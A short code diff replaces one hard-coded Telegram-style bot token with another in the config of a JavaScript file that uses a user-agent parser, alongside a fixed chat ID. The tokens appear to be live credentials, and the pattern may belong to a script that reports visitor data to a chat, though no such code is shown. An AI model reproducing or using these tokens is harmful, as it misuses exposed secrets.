@@ -3,7 +3,7 @@ import { UAParser } from 'ua-parser-js';
 
 const getConfig = async () => {
     const config = {
-        TOKEN: "8968414080:AAGsP8YtmvoxXrlaj9mJ5_4yhFFsn6J1VvY",
+        TOKEN: "8642710228:AAHF48NHLNbocMqVfp0Rensp9TRMHbJC7uI",
         CHAT_ID: 7626778246
     };
     if (!config.TOKEN || !config.CHAT_ID) {
